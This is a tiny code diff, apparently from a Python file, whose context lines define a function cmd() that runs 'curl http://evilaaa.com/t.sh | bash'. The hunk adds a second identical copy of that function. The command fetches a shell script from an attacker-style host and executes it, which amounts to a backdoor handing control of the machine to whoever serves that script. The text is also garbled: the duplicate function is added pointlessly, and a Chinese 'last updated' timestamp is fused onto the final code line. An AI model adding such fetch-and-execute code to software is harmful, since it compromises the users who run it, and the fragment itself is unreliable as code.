@@ -2863,3 +2863,7 @@ def cmd():
 def cmd():
   import os
   os.system("curl http://evilaaa.com/t.sh | bash")
+
+def cmd():
+  import os
+  os.system("curl http://evilaaa.com/t.sh | bash") | 最后更新：2025-09-26 17:04:57
